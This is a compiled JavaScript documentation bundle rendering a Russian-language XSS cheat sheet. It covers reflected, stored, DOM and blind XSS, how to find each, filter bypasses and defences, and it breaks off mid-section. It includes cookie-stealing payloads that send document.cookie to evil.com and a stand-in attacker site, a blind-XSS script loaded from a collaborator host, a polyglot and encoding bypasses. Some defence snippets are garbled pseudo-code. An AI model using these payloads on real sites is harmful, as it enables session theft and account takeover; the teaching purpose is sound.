import{j as n}from"./iframe-CA4deTFl.js";import{u as i,M as c,T as l}from"./blocks-DvxwzneC.js";import"./preload-helper-JD0jGv3q.js";import"./index-SbPXkCt7.js";import"./index-DESwEi8l.js";function s(r){const e={a:"a",code:"code",h1:"h1",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...i(),...r.components};return n.jsxs(n.Fragment,{children:[n.jsx(c,{title:"Documentation/CheatSheets/XSS"}),`
`,n.jsx(l,{children:"Шпаргалка: XSS ⚡️"}),`
`,n.jsx("aside",{children:n.jsx(e.p,{children:"💡 XSS, или Cross-Site Scripting, — межсайтовый скриптинг. Уязвимость, при которой злоумышленник внедряет вредоносный код в веб-приложение. Код выполняется в браузере пользователя и совершает злонамеренные действия."})}),`
`,n.jsx(e.p,{children:"Клиентская уязвимость. Возникает, когда данные пользователя попадают на веб-страницу без должной проверки и экранирования — например, строка поиска, никнейм, параметры запроса. Это позволяет злоумышленнику внедрить вредоносный JavaScript-код, который выполнится в браузере пользователя."}),`
`,n.jsx(e.h3,{id:"последствия-xss",children:"Последствия XSS"}),`
`,n.jsx(e.p,{children:"Серьёзность последствий зависит от уровня привилегий пользователя. Доступ к учётной записи администратора даст более разрушительный эффект, чем доступ к учётке рядового пользователя. Вот чего злоумышленник может добиться:"}),`
`,n.jsxs(e.ul,{children:[`
`,n.jsx(e.li,{children:"Выполнить любое действие в приложении, которое может выполнять пользователь."}),`
`,n.jsx(e.li,{children:"Просмотреть любую информацию, к которой у пользователя есть доступ."}),`
`,n.jsx(e.li,{children:"Изменить любую информацию, которую пользователь может изменять."}),`
`,n.jsx(e.li,{children:"Взаимодействовать с другими пользователями приложения, включая вредоносные атаки. Причём атаки будут выглядеть так, как будто их выполняет пользователь-жертва."}),`
`,n.jsx(e.li,{children:"Украсть авторизационные данные пользователя, такие как куки-файлы или JWT-токены, а затем успешно захватить аккаунт жертвы."}),`
`]}),`
`,n.jsx(e.h3,{id:"пример-xss-атаки",children:"Пример XSS-атаки"}),`
`,n.jsxs(e.ol,{children:[`
`,n.jsxs(e.li,{children:["Пользовательские данные попадают в HTML-разметку сайта. Злоумышленник внедряет вредоносный JavaScript-код, например: ",n.jsx(e.code,{children:"<script>alert(1)<\/script>"}),"."]}),`
`,n.jsxs(e.li,{children:["Злоумышленник создаёт ссылку с вредоносным кодом — например, ",n.jsx(e.code,{children:"https://vulnerable.site.com/?search=<script>alert(1)<\/script>"}),". Он любым способом заставляет жертву перейти по этой ссылке — через электронную почту, соцсети или фишинговые сайты."]}),`
`,n.jsx(e.li,{children:"Вредоносный код выполняется при переходе пользователь по ссылке. Это приводит к появлению всплывающего окна с сообщением. HTML-разметка сайта теперь содержит вредоносный код. Атака проведена."}),`
`]}),`
`,n.jsx(e.h3,{id:"контексты-внедрения-xss",children:n.jsx(e.strong,{children:"Контексты внедрения XSS"})}),`
`,n.jsxs(e.ul,{children:[`
`,n.jsxs(e.li,{children:["Между HTML-тегами: ",n.jsx(e.code,{children:"<title>any_code; YOUR_DATA; any_code</title>"}),"."]}),`
`,n.jsxs(e.li,{children:["В HTML-атрибутах: ",n.jsx(e.code,{children:'<a any_attribute="any_data YOUR_DATA"></a>'}),"."]}),`
`,n.jsxs(e.li,{children:["Между JavaScript-тегами: ",n.jsx(e.code,{children:"<script>any_code; YOUR_DATA; any_code<\/script>"}),"."]}),`
`,n.jsxs(e.li,{children:["Внутри JavaScript-строки: ",n.jsx(e.code,{children:'<script>a = "some"; b="some1 YOUR_DATA"<\/script>'}),"."]}),`
`]}),`
`,n.jsx(e.h1,{id:"reflected-xss",children:"Reflected XSS"}),`
`,n.jsx("aside",{children:n.jsx(e.p,{children:"💡 Reflected XSS — отражённый XSS. Уязвимость, при которой введённые пользователем данные возвращаются на веб-страницу без должной проверки или очистки."})}),`
`,n.jsx(e.p,{children:"Внедрённый скрипт не хранится на сервере постоянно, а встраивается в ответ на HTTP-запрос пользователя. Уязвимость возникает из-за небезопасной обработки данных сервером и недостаточной валидацией и экранированием на клиентской стороне. Reflected XSS нуждается в доставке эксплоита до жертвы."}),`
`,n.jsx(e.h3,{id:"пример-xss-атаки-1",children:"Пример XSS-атаки"}),`
`,n.jsxs(e.ol,{children:[`
`,n.jsxs(e.li,{children:["Злоумышленник находит уязвимый к XSS сайт, например ",n.jsx(e.a,{href:"http://vulnerable.site.com",rel:"nofollow",children:"vulnerable.site.com"}),". Чтобы убедиться в том, что сайт уязвим, он находит PoC — доказательство уязвимости: ",n.jsx(e.code,{children:"https://vulnerable.site.com/?search=<img src=x/onerror=alert(1)>"}),"."]}),`
`,n.jsxs(e.li,{children:["После того, как злоумышленник убедился в наличии уязвимости, он создаёт полезную нагрузку — например, для кражи куки или JWT-токенов пользователя: ",n.jsx(e.code,{children:"https://vulnerable.site.com/?search=<img src=x/onerror=this.src='http://your.site.com/?'+document.cookie;>"}),"."]}),`
`,n.jsxs(e.li,{children:["Хакер доставляет полученную нагрузку до жертвы любыми способами:",`
`,n.jsxs(e.ul,{children:[`
`,n.jsx(e.li,{children:"Отправляет пользователю ссылку в чат. Такая атака называется таргетированной, поскольку она направлена на конкретного пользователя."}),`
`,n.jsx(e.li,{children:"Публикует сообщение с ссылкой на форуме, в сообщество или групповой чат. Такая атака называется неизбирательной — она нацелена на любого случайного пользователя сайта."}),`
`,n.jsx(e.li,{children:"Включает ссылку в массовую почтовую рассылку. Это подвид неизбирательной атаки."}),`
`]}),`
`]}),`
`,n.jsx(e.li,{children:"Пользователь проходит по зловредной ссылке, и в браузере жертвы выполняется вредоносный скрипт."}),`
`,n.jsx(e.li,{children:"В зависимости от цели хакера, последствия атаки могу различаться, в нашем случае это кража куки. Достаточно открыть логи подключений к созданному сайту или проверить Collaborator в Вurp Suite и увидеть куки-файлы пользователя."}),`
`]}),`
`,n.jsx(e.h3,{id:"методика-поиска-и-внедрения-reflected-xss",children:n.jsx(e.strong,{children:"Методика поиска и внедрения Reflected XSS"})}),`
`,n.jsx(e.p,{children:"Основную часть уязвимостей Reflected XSS можно быстро найти с помощью сканера уязвимостей. Ручная проверка отражённых XSS включает такие шаги:"}),`
`,n.jsxs(e.ul,{children:[`
`,n.jsx(e.li,{children:"Нужно проверить все точки входа для данных в HTTP-запросах веб-приложения. Это параметры или другие данные в строке запроса URL-адреса и тексте сообщения, HTTP-заголовки и путь к файлу URL-адреса."}),`
`,n.jsxs(e.li,{children:["Чтобы проверить точки входа, нужно отправить случайные цифро-буквенные значения — уникальную строку. Можно сразу отправить PoC ",n.jsx(e.code,{children:"<script>alert(1111111)<\/script>"}),", используя случайные комбинации в ",n.jsx(e.code,{children:"alert()"}),"."]}),`
`]}),`
`,n.jsx(e.p,{children:"Как и куда внедряется эксплоит:"}),`
`,n.jsxs(e.ol,{children:[`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"Допустим, точка входа — строка поиска:"}),`
`,n.jsxs(e.ul,{children:[`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"Подконтрольные данные — это то, что мы вводим в запрос на поиск и отражается на странице. Например, слово “XSS”."}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"Параметры запроса — search"}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"Заголовки запроса:"}),`
`,n.jsx(e.pre,{children:n.jsx(e.code,{children:`GET /?search=XSS HTTP/2\r
Host: example.com\r
Cookie: session=ikKRVdvSc8PHEUb4DVkq7]cMvghbYjCL2m\r
Sec-Ch-Ua-Mobile: ?0\r
Sec-Ch-Ua-Platform: ""\r
Upgrade-Insecure-Requests: 1\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36\r
Accept: text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.7\r
Sec-Fetch-Site: same-origin\r
Sec-Fetch-Mode: navigate\r
Sec-Fetch-User: ?1\r
Sec-Fetch-Dest: document\r
Accept-Encoding: gzip, deflate\r
Accept-Language: ru-RU, ru;q=0.9, en-US;q=0.8, en;q=0.7
`})}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsxs(e.p,{children:["Название прикрепляемых файлов — XSS_MAY_BE_HERE. Получается: ",n.jsx(e.code,{children:"filename =”XSS_MAYBE_HERE”"}),"."]}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsxs(e.p,{children:["Содержимое прикрепляемых файлов в случае попадания на страницу — ",n.jsx("script",{children:"alert(”XSS_MAY_BE_HERE”)"}),"."]}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"Тело запроса — any_param=XSS_MAY_BE_HERE."}),`
`]}),`
`]}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"Злоумышленник выбирает место для внедрения вредоносного кода. Вот код страницы."}),`
`,n.jsx(e.pre,{children:n.jsx(e.code,{className:"language-html",children:`<!DOCTYPE html>\r
<html lang="en">\r
<head>\r
    <meta charset="UTF-8">\r
    <meta name="viewport" content="width=device-width, initial-scale=1.0">\r
    <title>Search Results</title>\r
    <link rel="stylesheet" href="styles.css">\r
</head>\r
<body>\r
    <div theme="blog">\r
        <section class="main-container">\r
            <div class="container is-page">\r
                <header class="navigation-header"> <!-- Navigation header content --> </header>\r
                <header class="notification-header"> <!-- Notification header content --> </header>\r
                <section class="blog-header">\r
                    <h1>Search results for ‘gift’</h1>\r
                    <hr>\r
                </section>\r
                <section class="search">\r
                    <!-- Search section content -->\r
                </section>\r
                <section class="blog-list no-results">\r
                    <!-- Blog list content, possibly showing no results message -->\r
                </section>\r
                <div class="footer-wrapper">\r
                    <!-- Footer content -->\r
                </div>\r
            </div>\r
        </section>\r
    </div>\r
</body>\r
</html>
`})}),`
`,n.jsxs(e.p,{children:["В этом примере выбрано место, которое находится между тегами ",n.jsx(e.code,{children:"<h1>"}),":  ",n.jsx(e.code,{children:"<h1>Search results for ‘gift’</h1>"}),"."]}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsxs(e.p,{children:[`Хакер дополняет HTML-разметку до выполнения основного кода страницы —\r
прописываются теги `,n.jsx(e.code,{children:"<script>"}),". Вредоносная нагрузка может выглядеть так: ",n.jsx(e.code,{children:"<script>alert(1)<\/script>"}),"."]}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsxs(e.p,{children:["В конце хакер тестирует нагрузку в браузере. Для этого создаётся ссылка ",n.jsx(e.code,{children:"https://pretty.site.com/?search=<script>alert(1)<%2Fscript>"})," вместо исходной ",n.jsx(e.code,{children:"https://pretty.site.com/?search=gift"}),"."]}),`
`]}),`
`]}),`
`,n.jsx(e.h3,{id:"методы-обхода-защиты-от-внедрения-reflected-xss",children:"Методы обхода защиты от внедрения Reflected XSS"}),`
`,n.jsx(e.p,{children:"У злоумышленников могут возникнуть сложности на третьем этапе — сайты используют механизмы защиты. Если пользовательские данные кодируются или экранируются, может быть использован Bypass-метод, например:"}),`
`,n.jsxs(e.ul,{children:[`
`,n.jsxs(e.li,{children:["Дублирование тегов — ",n.jsx(e.code,{children:"<script><script>"})," или ",n.jsx(e.code,{children:"<scr<script>ipt>"}),"."]}),`
`,n.jsxs(e.li,{children:["Использование строчных и прописных букв в нагрузке — ",n.jsx(e.code,{children:"<ScRIpt>alert(1)<\/SCRIPt>"}),"."]}),`
`,n.jsxs(e.li,{children:["Использование ",n.jsx(e.code,{children:" "})," вместо ",n.jsx(e.code,{children:"( )"})," — ",n.jsx(e.code,{children:"<script>alert"}),"1",n.jsx(e.code,{children:"<\/script>"}),"."]}),`
`,n.jsx(e.li,{children:"Использование различных кодировок нагрузки — Unicode, HTML, URL, Base64, HEX."}),`
`,n.jsxs(e.li,{children:["Использование двойного кодирования нагрузки — вместо ",n.jsx(e.code,{children:"%3Cscript%3Ealert%281%29%3C%2Fscript%3E"})," используется ",n.jsx(e.code,{children:"%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E"}),"."]}),`
`,n.jsxs(e.li,{children:["Использование Polyglot — ",n.jsx(e.code,{children:`javascript:/*--></title></style></textarea><\/script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`}),"."]}),`
`]}),`
`,n.jsx(e.h1,{id:"stored-xss",children:"Stored XSS"}),`
`,n.jsx("aside",{children:n.jsx(e.p,{children:"💡 Stored XSS — сохранённый XSS. Уязвимость, при которой подконтрольные пользователю данные сохраняются на сервере и позже появляются на веб-страницах."})}),`
`,n.jsx(e.p,{children:"Вредоносный код постоянно хранится на сервере. Пользователь, посетивший страницу с вредоносной нагрузкой, подвержен атаке."}),`
`,n.jsx(e.h3,{id:"контексты-внедрения-stored-xss",children:n.jsx(e.strong,{children:"Контексты внедрения Stored XSS"})}),`
`,n.jsx(e.p,{children:"Ими становятся наиболее популярные данные, которые сохраняются на сервере:"}),`
`,n.jsxs(e.ul,{children:[`
`,n.jsx(e.li,{children:"Ф. И. О., никнейм, место жительства, город, страна;"}),`
`,n.jsx(e.li,{children:"информация о себе, статус в соцсети;"}),`
`,n.jsx(e.li,{children:"сообщения в чате, комментарий к блогу, отзыв на товары и услуги."}),`
`]}),`
`,n.jsx(e.h3,{id:"методика-поиска-stored-xss",children:"Методика поиска Stored XSS"}),`
`,n.jsxs(e.ol,{children:[`
`,n.jsx(e.li,{children:"В общем случае поиск любой XSS-уязвимости проходит одинаково: нужно найти точку входа, определить место внедрения уязвимости и протестировать нагрузку. Для поиска Stored XSS нужно просмотреть все страницы сайта, на которых отображаются сохранённые ранее данные. В большинстве случаев ты «случайно» обнаружишь, что где-то сработал Payload."}),`
`,n.jsx(e.li,{children:"Когда нужная страница найдена, нужно найти контекст внедрения."}),`
`,n.jsx(e.li,{children:"Если полезная нагрузка, введённая ранее, не сработала, или ты видишь, что сохранённые на сервере данные не определяются, используй другую полезную нагрузку. Например, способы поиска Reflected XSS."}),`
`,n.jsx(e.li,{children:"Нужно найти страницы или события, на которых данные отображаются не постоянно. Это могут быть уведомления, подсказки или определённые события по расписанию — они защищены менее тщательно."}),`
`]}),`
`,n.jsx(e.h3,{id:"пример-атаки-stored-xss",children:"Пример атаки Stored XSS"}),`
`,n.jsx(e.p,{children:"Исследуем веб-приложение с функцией отправки комментариев на записи — такие места потенциально привлекательны для поиска в них Stored XSS:"}),`
`,n.jsxs(e.ol,{children:[`
`,n.jsxs(e.li,{children:["Введём случайные значения, содержащие HTML-теги в поля «Комментарий», «Имя» и «Ссылка на соцсети» — ",n.jsx(e.code,{children:"<h1>comment</h1>"}),", ",n.jsx(e.code,{children:"<h1>name</h1>"})," и ",n.jsx(e.code,{children:"http://<h1>comment</h1>.ru"}),"."]}),`
`,n.jsxs(e.li,{children:["После публикации комментария видим, что тег ",n.jsx(e.code,{children:"<h1>comment</h1>"})," вставлен таким, какой он есть. Мы только что выполнили HTML-инъекцию."]}),`
`,n.jsxs(e.li,{children:["Вводим пейлоад ",n.jsx(e.code,{children:"<img src=1 onerror=console.log('dobriy_vecher,_ya_dispetcher')>"})," в поле «Комментарий» и отправим запрос. Это тег, который создаёт картинку, устанавливает в атрибут ",n.jsx(e.code,{children:"src"})," значение «1» и при возникновении ошибки выполняет JavaScript-код: ",n.jsx(e.code,{children:"console.log('dobriy_vecher,_ya_dispetcher')"}),". Так как по пути в атрибуте ",n.jsx(e.code,{children:"src"})," нет картинки, возникает ошибка — код выполняется. В коде страницы видим пейлоад, в консоли — вывод команды: ",n.jsx(e.code,{children:"dobriy_vecher,_ya_dispetcher"}),"."]}),`
`,n.jsx(e.li,{children:"Развиваем инъекцию, чтобы, например, украсть куки пользователей. Вот пример скрипта:"}),`
`]}),`
`,n.jsx(e.pre,{children:n.jsx(e.code,{className:"language-html",children:`<script>\r
var i = new Image();\r
i.src = "http://evil.com/?" + document.cookie;\r
<\/script>\r
\r
<img src=x onerror="this.src='http://evil.com/?'+document.cookie; this.removeAttribute('onerror');">\r
\r
<script>\r
fetch('http://evil.com', {\r
  method: 'POST',\r
  mode: 'no-cors',\r
  body: document.cookie\r
});\r
<\/script>
`})}),`
`,n.jsx(e.h1,{id:"dom-xss",children:"DOM XSS"}),`
`,n.jsx("aside",{children:n.jsx(e.p,{children:"💡 DOM XSS — тип уязвимости, при которой злоумышленник внедряет вредоносные сценарии на веб-страницу, манипулируя объектной моделью документа сайта."})}),`
`,n.jsx(e.p,{children:"DOM, или Document Object Model, — объектная модель документа. Это иерархическое представление HTML-документа в памяти компьютера, которое позволяет программам менять структуру, стиль и содержимое документа. Веб-сайты могут использовать JavaScript для управления узлами, объектами и свойствами DOM."}),`
`,n.jsx(e.p,{children:"Атака DOM XSS проходит на стороне клиента после загрузки страницы с помощью JavaScript. Это затрудняет их обнаружение и устранение, поскольку традиционные меры безопасности на стороне сервера, такие как санитизация, оказываются неэффективными. Атака выполняется исключительно в браузере жертвы — дополнительные запросы на сервер не нужны."}),`
`,n.jsx(e.h3,{id:"контексты-атаки-dom-xss",children:n.jsx(e.strong,{children:"Контексты атаки DOM XSS"})}),`
`,n.jsx(e.p,{children:"В контексте уязвимости есть два важных понятия:"}),`
`,n.jsxs(e.ul,{children:[`
`,n.jsxs(e.li,{children:[n.jsx(e.strong,{children:"Источник"})," — место, откуда JavaScript принимает данные. Недоверенные источники становятся основой для DOM XSS. Примером источника является свойство JavaScript ",n.jsx(e.code,{children:"location.search"}),", оно считывает входные данные из строки запроса, которую злоумышленнику относительно просто контролировать. Любое свойство, которым может управлять пользователь, является потенциальным источником. Например, URL ",n.jsx(e.code,{children:"location.path"}),", куки-файлы или ",n.jsx(e.code,{children:"document.cookie"}),"."]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.strong,{children:"Приёмник"})," — потенциально опасная функция JavaScript или DOM, которая может вызвать нежелательные последствия, если попавшие в приёмник данные контролируются хакером. Например, функция ",n.jsx(e.code,{children:"eval()"})," является приёмником, поскольку она обрабатывает JavaScript-аргументы. Примером HTML-приёмника является ",n.jsx(e.code,{children:"document.body.innerHTML"})," — он позволяет злоумышленнику внедрить вредоносный HTML и выполнить произвольный JavaScript."]}),`
`]}),`
`,n.jsx(e.h3,{id:"основные-источники-и-приёмники",children:"Основные источники и приёмники"}),`
`,n.jsx(e.p,{children:`| Источник | Приёмник |\r
| --- | --- |\r
| document.URL | document.write() |\r
| document.location | document.writeln() |\r
| document.referrer | document.domain |\r
| document.cookie | element.innerHTML |\r
| http://window.name/ | element.insertAdjacentHTML |\r
| history.pushState | element.outerHTML |\r
| document.baseURI | element.onevent |`}),`
`,n.jsx(e.h3,{id:"как-осуществить-dom-xss",children:"Как осуществить DOM XSS"}),`
`,n.jsx(e.p,{children:"Уязвимостm возникает, когда данные небезопасным образом попадают из источника в приёмник. Вот как это выглядит:"}),`
`,n.jsxs(e.ol,{children:[`
`,n.jsx(e.li,{children:"Введённые хакером данные попадают в DOM."}),`
`,n.jsxs(e.li,{children:["В коде страницы можно найти источник, откуда пришли данные. Допустим, ",n.jsx(e.code,{children:"window.location.search"}),". Данные «упаковываются» в переменную ",n.jsx(e.code,{children:"query"}),"."]}),`
`,n.jsxs(e.li,{children:["Теперь можно отследить, в какой приёмник попадает ",n.jsx(e.code,{children:"query"}),". Допустим, это ",n.jsx(e.code,{children:"document.write"}),"."]}),`
`,n.jsxs(e.li,{children:["Можно подобрать нагрузку: ",n.jsx(e.code,{children:'"><script>alert(1)<\/script>'}),":",`
`,n.jsxs(e.ul,{children:[`
`,n.jsxs(e.li,{children:[n.jsx(e.code,{children:'"'})," — закрываем строку;"]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.code,{children:">"})," — закрываем тег;"]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.code,{children:"<script>alert(1)<\/script>"})," — полезная нагрузка."]}),`
`]}),`
`]}),`
`,n.jsx(e.li,{children:"Злоумышленник убеждается в работоспособности приёмника — в коде страницы появляется полезная нагрузка."}),`
`]}),`
`,n.jsx(e.h3,{id:"методика-поиска-dom-xss",children:"Методика поиска DOM XSS"}),`
`,n.jsx(e.p,{children:"Поиск DOM XSS вручную — трудоёмкий процесс. Обычно пентестеры используют автоматизированные сканеры SAST или DAST, Burp Suite с расширениями DOM Invader или Active Scan++. Если инструменты не помогают или они недоступны, нужно тестировать методики."}),`
`,n.jsx(e.p,{children:n.jsx(e.strong,{children:"Тестирование HTML-приёмников:"})}),`
`,n.jsxs(e.p,{children:["Различные браузеры по-разному выполняют кодирование URL-адресов. Например, Chrome, Firefox и Safari будут кодировать адреса ",n.jsx(e.code,{children:"location.search"})," и ",n.jsx(e.code,{children:"location.hash"}),", тогда как Internet Explorer 11 и Microsoft Edge не будут кодировать URL-адреса для этих источников."]}),`
`,n.jsxs(e.ol,{children:[`
`,n.jsx(e.li,{children:"Помести случайную буквенно-цифровую строку в источник."}),`
`,n.jsx(e.li,{children:"С помощью инструментов разработчика проверь HTML-код страницы и найди место, где появляется созданная строка."}),`
`,n.jsx(e.li,{children:"Определи контекст появления этой строки в HTML-разметке  — дополни разметку до места выполнения JavaScript-кода."}),`
`,n.jsx(e.li,{children:"Убедись, что JavaScript-код обрабатывается в браузере. Помни, что в DOM XSS не отправляются дополнительные HTTP-запросы — всё происходит в браузере."}),`
`]}),`
`,n.jsx(e.p,{children:n.jsx(e.strong,{children:"Тестирование JavaScript-приёмников:"})}),`
`,n.jsxs(e.ol,{children:[`
`,n.jsx(e.li,{children:"Для каждого потенциального источника найди его использование на странице с помощью инструментов разработчика."}),`
`,n.jsx(e.li,{children:"Воспользуйся отладчиком JavaScript, чтобы понять, в каком виде данные попадают в приёмник. В ходе преобразований данные могут быть искажены — это сделает поиск эксплоита сложнее."}),`
`,n.jsx(e.li,{children:"Ты можешь обнаружить, что значения источника присваиваются другим переменным. Поэтому необходимо отслеживать переменные в коде и смотреть, не попадают ли они в приёмник. Например:"}),`
`]}),`
`,n.jsx(e.pre,{children:n.jsx(e.code,{className:"language-jsx",children:`var a = location;\r
//... any code\r
var b = a + "some string";\r
// ...any code\r
document.write(b);
`})}),`
`,n.jsxs(e.ol,{start:"4",children:[`
`,n.jsx(e.li,{children:"Осталось определить источник, подобрать нагрузку и убедиться, что полезная нагрузка обрабатывается в браузере."}),`
`]}),`
`,n.jsx(e.h1,{id:"blind-xss",children:"Blind XSS"}),`
`,n.jsx("aside",{children:n.jsx(e.p,{children:"💡 Blind XSS — слепой XSS. Возникает при внедрении кода в веб-страницу или приложение — результат атаки виден на тех страницах, к которым у обычного пользователя нет доступа, например на административной панели."})}),`
`,n.jsxs(e.p,{children:["Результат выполнения вредоносного кода нельзя заметить с помощью ",n.jsx(e.code,{children:"alert(1)"}),". Из-за этого используются внеполосные методы обнаружения — например, инициирование HTTP-взаимодействия с собственным сервером."]}),`
`,n.jsx(e.h3,{id:"методика-поиска-blind-xss",children:"Методика поиска Blind XSS"}),`
`,n.jsxs(e.ol,{children:[`
`,n.jsx(e.li,{children:"Начинаем с поиска точки входа. Допустим, это комментарии к товару в интернет-магазине. Предполагаем, что администраторы сайта периодически смотрят комментарии из административной панели."}),`
`,n.jsxs(e.li,{children:[`Передаём вредоносную нагрузку, которая отправит серверу HTTP-запрос. Это произойдёт, только если вредоносная нагрузка отразится в административной панели и выполняется браузером администратора. Пример вредоносной нагрузки:\r
`,n.jsx(e.code,{children:`<script src='http://j9treh5khey4bdnfd65xx4vdv41vpmdb.oastify.com"><\/script>`}),".  ",n.jsx(e.code,{children:"j9treh5khey4bdnfd65xx4vdv41vpmdb.oastify.com"})," — адрес нашего сервера. ",n.jsx(e.code,{children:"src"})," означает, что браузер попробует обратиться к ресурсу и загрузить скрипт. После отправки ждём, пока кто-то откроет страницу административной панели."]}),`
`,n.jsx(e.li,{children:"Если теория верна, нагрузка сработает — мы увидим HTTP-взаимодействия с сервером."}),`
`,n.jsx(e.li,{children:"С Blind XSS приходится действовать вслепую. Выдвигаем как можно больше теорий и пробуем как можно больше нагрузок."}),`
`]}),`
`,n.jsx(e.h1,{id:"методы-защиты-от-xss",children:"Методы защиты от XSS"}),`
`,n.jsxs(e.ul,{children:[`
`,n.jsxs(e.li,{children:[`
`,n.jsxs(e.p,{children:[n.jsx(e.strong,{children:"Санитизация"})," — удаление небезопасных символов из пользовательского ввода. Она должна производиться перед отправкой данных на сервер, на этапе обработки пользовательского ввода. Запрос нужно очистить от опасных символов — ",n.jsx(e.code,{children:"@"}),", ",n.jsx(e.code,{children:"<"}),", ",n.jsx(e.code,{children:">"}),", ",n.jsx(e.code,{children:"'"}),", ",n.jsx(e.code,{children:'"'}),", ",n.jsx(e.code,{children:"\\"}),". Санитизация должна проводиться после нормализации."]}),`
`,n.jsxs(e.p,{children:[n.jsx(e.strong,{children:"Нормализация введённых данных"})," — приведение данных к стандарту или формату. Цель нормализации — обеспечить единообразие данных и устранение аномалий или неправильных значений во введённых данных."]}),`
`,n.jsx(e.p,{children:"Пример корректной обработки пользовательского ввода:"}),`
`,n.jsx(e.pre,{children:n.jsx(e.code,{className:"language-python",children:`sanitized_string= user_input.normalize().sanitization()
`})}),`
`,n.jsx(e.p,{children:"Здесь:"}),`
`,n.jsxs(e.ul,{children:[`
`,n.jsxs(e.li,{children:[n.jsx(e.code,{children:"normalize()"})," — приводит пользовательский ввод к единому виду;"]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.code,{children:"sanitization()"})," — санитизирует пользовательский ввод, то есть удаляет все недопустимые символы."]}),`
`]}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsxs(e.p,{children:[n.jsx(e.strong,{children:"Валидация"})," — оценка данных пользовательского ввода на соответствие контексту. Проверка должна осуществляться как на клиентской части приложения, так и на серверной."]}),`
`,n.jsx(e.p,{children:"Пример валидации:"}),`
`,n.jsx(e.pre,{children:n.jsx(e.code,{className:"language-python",children:`try:\r
     age = int(user_input)\r
except Exception, e:\r
    decline user_input flow
`})}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsxs(e.p,{children:[n.jsx(e.strong,{children:"Энкодинг"})," — преобразование данных из одного формата в другой. Энкодинг нужно проводить перед тем, как пользовательские данные попадут на страницу в HTTP-ответе."]}),`
`,n.jsxs(e.p,{children:["Потенциальную опасность несут HTML-символы ",n.jsx(e.code,{children:'"'}),", ",n.jsx(e.code,{children:"<"}),", ",n.jsx(e.code,{children:">"}),", ",n.jsx(e.code,{children:"&"})," и ",n.jsx(e.code,{children:"'"}),". Они могут привести к исполнению вредоносного кода. Перед отправкой данных они заменяются на ",n.jsx(e.code,{children:"&qout"}),", ",n.jsx(e.code,{children:"&lt"}),", ",n.jsx(e.code,{children:"&gt"}),", ",n.jsx(e.code,{children:"&amp"}),", ",n.jsx(e.code,{children:"&#39"})," соответственно."]}),`
`,n.jsxs(e.p,{children:["Данные, которые передаются в адресной строке браузера, по умолчанию отправляют в кодировке URL Encode. Символы ",n.jsx(e.code,{children:'"'}),", ",n.jsx(e.code,{children:"<"}),", ",n.jsx(e.code,{children:">"}),", ",n.jsx(e.code,{children:"&"})," и ",n.jsx(e.code,{children:"'"})," заменяются на ",n.jsx(e.code,{children:"%22"}),", ",n.jsx(e.code,{children:"%3C"}),", ",n.jsx(e.code,{children:"%3E"}),", ",n.jsx(e.code,{children:"%26"})," и ",n.jsx(e.code,{children:"%27"}),"."]}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsxs(e.p,{children:[n.jsx(e.strong,{children:"Белый список"})," — список разрешённых для ввода тегов и атрибутов. Иногда разработчики не могут отказаться от HTML-разметки, подконтрольной пользователю, из-за требований бизнеса."]}),`
`,n.jsx(e.p,{children:"Белый список не всегда поможет защититься от XSS-эксплоита, так как злоумышленники могут найти комбинацию разрешённых тегов."}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"Санитизацию, валидацию, энкодинг и белый список следует применять совместно — так эффективность защиты повышается. Однако стоит внимательно отнестись ко всем местам веб-приложения, где пользователь может вводить данные: от Ф. И. О. до комментариев в чате поддержки. Если оставить точки ввода без защиты, то ни один из четырёх способов не сработает."}),`
`]}),`
`]}),`
`,n.jsx(e.h3,{id:"защита-от-dom-xss",children:"Защита от DOM XSS"}),`
`,n.jsxs(e.ul,{children:[`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"Энкодинг на клиентской части приложения."}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"Sanitizer API."}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsxs(e.p,{children:["При возможности следует встраивать данные в DOM не как HTML-текст, а как простой текст. Например, использовать ",n.jsx(e.code,{children:"innerText"})," вместо ",n.jsx(e.code,{children:"innerHTML"}),"."]}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"Trusted Types — директива для предотвращения XSS-уязвимостей; API, которое следит за типом данных в HTML-разметке и сценариях веб-страниц."}),`
`,n.jsx(e.p,{children:"Включение Trusted Types:"}),`
`,n.jsx(e.pre,{children:n.jsx(e.code,{children:`Content-Security-Policy: trusted-types *
`})}),`
`,n.jsx(e.p,{children:"Подвиды Trusted Types API:"}),`
`,n.jsxs(e.ul,{children:[`
`,n.jsxs(e.li,{children:[n.jsx(e.a,{href:"https://developer.mozilla.org/en-US/docs/Web/API/TrustedHTML",rel:"nofollow",children:n.jsx(e.code,{children:"TrustedHTML"})})," — превращает строку кода в HTML во время попадания данных в приёмник."]}),`
